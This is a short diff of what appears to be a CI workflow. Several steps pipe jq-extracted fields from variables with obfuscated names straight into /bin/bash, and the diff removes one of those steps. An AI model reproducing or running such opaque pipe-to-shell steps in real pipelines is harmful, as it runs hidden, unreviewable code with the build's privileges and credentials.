@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$n47" | jq -r .ekw08280 | /bin/bash
           echo $am822 | jq -r .midv942 | /bin/bash
           echo $vay18525 | jq -r .ezmgq06 | /bin/bash
-          echo $t70963 | jq -r .thubm3715 | /bin/bash
           echo $h0543 | jq -r .i357 | /bin/bash
           printf '%s' "$t06675" | jq -r .zg32 | /bin/bash
 
